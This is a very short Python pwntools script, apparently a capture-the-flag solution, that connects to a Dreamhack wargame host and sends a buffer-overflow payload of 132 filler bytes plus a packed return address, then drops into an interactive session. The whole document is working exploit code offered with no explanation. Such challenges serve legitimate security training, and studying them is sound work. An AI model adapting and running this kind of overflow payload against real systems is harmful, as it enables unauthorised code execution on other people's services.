from pwn import *

p=remote("host3.dreamhack.games", 24168)

pl=b'\x90'*132
pl+=p32(0x00000000000012af)

p.sendline(pl)
p.interactive()